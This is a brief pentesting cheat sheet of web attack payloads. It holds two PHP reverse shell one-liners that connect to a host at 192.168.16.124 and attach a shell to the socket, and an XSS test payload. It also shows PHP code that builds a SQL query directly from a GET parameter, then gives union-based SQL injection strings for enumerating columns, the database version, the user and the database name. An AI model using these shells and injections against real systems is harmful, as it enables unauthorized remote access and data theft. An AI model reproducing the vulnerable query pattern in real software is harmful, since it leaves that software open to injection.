# web

PHP
---

Reverse shell one-liners:

<?php $s=fsockopen(\"192.168.16.124\",1234);exec("sh<%263>%263 2>%263");?>

<?php $s=fsockopen("192.168.16.124",1234);exec("sh<&3>&3 2>&3") ;?>


XSS
---

(script)alert("XSS")(/script) - use angle brackets instead of parentheses


SQL INJECTION
-------------

Vulenrable code example:

```
$id=$_GET['id'];

$getid="SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result=mysql_query($getid) or die('
<pre>' . mysql_error() . '</pre>
' );
```

* Figure out how many columns are there:

`‘ ORDER BY 1#`
`‘ ORDER BY 2#`

etc.

* Find out the database version:

`‘ UNION ALL SELECT 1,@@VERSION#`

* Find out the database the user is running as and the name of the database:

`‘ UNION ALL SELECT user(),database()#`